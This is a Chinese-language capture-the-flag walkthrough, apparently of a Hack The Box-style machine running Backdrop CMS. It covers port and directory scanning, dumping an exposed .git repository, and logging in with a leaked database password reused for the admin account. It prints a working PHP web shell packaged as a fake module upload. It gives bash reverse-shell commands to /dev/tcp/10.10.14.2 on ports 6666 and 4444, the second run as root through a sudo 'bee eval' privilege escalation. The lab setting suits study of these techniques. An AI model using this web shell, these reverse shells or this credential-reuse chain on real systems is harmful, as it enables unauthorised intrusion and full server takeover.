# 信息搜集
1. 用namp 扫描靶机端口信息
```bash
nmap -sS -sV -T4 -Pn 10.10.11.58
```
nmap结果
```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2025-03-27 10:37 CST
Nmap scan report for 10.10.11.58
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
80端口的web服务，先拿到管理员账户和密码进入web后台管理

2.爆破一下web的后台目录看看有没有有用的信息
```bash
ffuf -u http://10.10.11.58/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 30 -of html -o ffuf_results.html
```
后台目录能登录进去的也就是服务器状态码显示200的
```bash
└─# ffuf -u http://10.10.11.58/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 30 -of html -o ffuf_results.html


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.58/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Output file      : ffuf_results.html
 :: File format      : html
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 30
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 13332, Words: 1368, Lines: 202, Duration: 969ms]
    * FUZZ: 

[Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 2962ms]
    * FUZZ: .hta

[Status: 200, Size: 23, Words: 2, Lines: 2, Duration: 3965ms]
    * FUZZ: .git/HEAD

[Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 3966ms]
    * FUZZ: .htpasswd

[Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4969ms]
    * FUZZ: .htaccess

[Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 167ms]
    * FUZZ: core

[Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 183ms]
    * FUZZ: files

[Status: 200, Size: 13332, Words: 1368, Lines: 202, Duration: 212ms]
    * FUZZ: index.php

[Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 175ms]
    * FUZZ: layouts

[Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 168ms]
    * FUZZ: modules

[Status: 200, Size: 1198, Words: 114, Lines: 47, Duration: 177ms]
    * FUZZ: robots.txt

[Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 168ms]
    * FUZZ: server-status

[Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 170ms]
    * FUZZ: sites

[Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 178ms]
    * FUZZ: themes
```
可以看到 .git/head 目录是对外开放的 我们进去看一下有什么东西
```bash
ref: refs/heads/master
```
这说明服务器上真的存在一个完整的 .git 仓库，并且 HEAD 指向主分支（master），说明我们极有可能能把整个源代码库 dump 下来
```bash
git-dumper http://10.10.11.58/.git/ ./git-dump/
```
这里也是成功获取到了许多源代码 看一下框架的结构

```bash
cd git-dump/
ls -la
tree -L 2
```
框架的结构是：
```bash
─ core
│   ├── authorize.php
│   ├── cron.php
│   ├── includes
│   ├── install.php
│   ├── layouts
│   ├── misc
│   ├── modules
│   ├── profiles
│   ├── scripts
│   ├── themes
│   └── update.php
├── files
│   ├── config_83dddd18e1ec67fd8ff5bba2453c7fb3
│   ├── css
│   ├── field
│   ├── js
│   ├── README.md
│   └── styles
├── index.php
├── layouts
│   └── README.md
├── LICENSE.txt
├── README.md
├── robots.txt
├── settings.php
├── sites
│   ├── README.md
│   └── sites.php
└── themes
```
我们看一下其中的setting.php
cat 之后 发现比较重要的内容是一个数据库的密码 但是我们没有用户名
``` bash
<?php
/**
 * @file
 * Main Backdrop CMS configuration file.
 */

/**
 * Database configuration:
 *
 * Most sites can configure their database by entering the connection string
 * below. If using primary/replica databases or multiple connections, see the
 * advanced database documentation at
 * https://api.backdropcms.org/database-configuration
 */
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';

/**
 * Site configuration files location.
 *
 * By default these directories are stored within the files directory with a
 * hashed path. For the best security, these directories should be in a location
 * that is not publicly accessible through a web browser.
 *
 * Example using directories one parent level up:
 * @code
 * $config_directories['active'] = '../config/active';
 * $config_directories['staging'] = '../config/staging';
 * @endcode
 *
```
我这里只截取了文件的一部分 可以看到数据库用户名: root 密码:BackDropJ2024DS2024
现在需要祈祷网站后台管理的密码和数据库是一个密码
先尝试获取后台的用户名，检索user，之类的都没什么用
常识检索邮箱 发现了两个用户
```bash
└─# grep -R "@dog.htb" *
files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
```
还有一个就是root 那么们输入 user：tiffany 还有密码：BackDropJ2024DS2024
这样也是成功登录进了后台
![image](https://github.com/user-attachments/assets/08860bb9-84fa-47d8-aa0c-26ecc4155063)
![image](https://github.com/user-attachments/assets/95bd885c-9b74-4148-92a2-027bbe9fd8ae)

# 漏洞利用

下面就是看一下这个网页框架是什么 和对应的版本 针对特性 搜索已经有的漏洞进行利用
Reports（报告） → Status report（状态报告）在这个里面有版本信息
是Info
	Backdrop CMS 1.27.1 

根据公开漏洞记录：
1.27.1 并未修复后续版本中的某些 XSS、文件上传或模块注入漏洞
你当前拥有 管理员权限，即便没有远程漏洞，也可以通过上传模块或模板注入实现 RCE（远程命令执行）

![image](https://github.com/user-attachments/assets/d3b27d8d-dd75-4165-8985-e381b89a721b)
我们发现这里可以手动上传模块，文件格式有要求是 tar.gz 打包.info 和小马.php 
info 文件:
```bash
 type = module
    name = Block
    description = Controls the visual building blocks a page is constructed
    with. Blocks are boxes of content rendered into an area, or region, of a
    web page.
    package = Layouts
    tags[] = Blocks
    tags[] = Site Architecture
    version = BACKDROP_VERSION
    backdrop = 1.x

    configure = admin/structure/block

    ; Added by Backdrop CMS packaging script on 2024-03-07
    project = backdrop
    version = 1.27.1
    timestamp = 1709862662
```

小马：
```php
    <html>
    <body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
    <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
    <input type="SUBMIT" value="Execute">
    </form>
    <pre>
    <?php
    if(isset($_GET['cmd']))
    {
    system($_GET['cmd']);
    }
    ?>
    </pre>
    </body>
    </html>
```
把这两个文件打包上传
```bash
tar -cvzf shell.tar.gz shell/
```
在浏览器访问我们上传小马的目录并执行： http://10.10.11.58/modules/shell/shell.php?cmd=id
会弹出一下页面
![image](https://github.com/user-attachments/assets/94881763-6509-434c-84e4-df9a01a2c674)

我们运行一个后门 反弹shell 把终端弹到我自己电脑的6666端口上
```bash
bash -c 'exec bash -i &>/dev/tcp/10.10.14.2/6666 <&1'
```
![image](https://github.com/user-attachments/assets/5aa73afe-0dd0-4ac9-b62e-52b5d2989925)

这边是成功连接到靶机
我们发现userflag wwwdata用户没有权限获取 他在johncusack目录下 那我们应该是需要尝试切换到
johncusack账户
```bash
su johncusack 
```
这边输入密码后 我一开始没有反应，应该是shell不够稳定 我运行了以下代码加固我的shell
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```
重新尝试登录，成功获取到了userflag

# 内网提权
我们检查一下sudo 权限， 看看有没有密码就可以执行的命令
```bash
sudo -l
```
返回结果

```bash
(ALL) NOPASSWD: /usr/local/bin/bee
```
```bash
sudo /usr/local/bin/bee --root=/var/www/html
```

发现存在eval命令 根据eval 构建payload

```bash
sudo /usr/local/bin/bee --root=/var/www/html eval "shell_exec('bash -c \"bash -i >& /dev/tcp/10.10.14.2/4444 0>&1\"');"
```
成功把root shell 弹到我的4444端口上（我用 root 身份在目标机上执行一个反弹 shell 脚本，回连我 Kali 的 4444 端口）

![image](https://github.com/user-attachments/assets/b98bf4eb-8805-4109-bd2d-df0c4a56ccad)
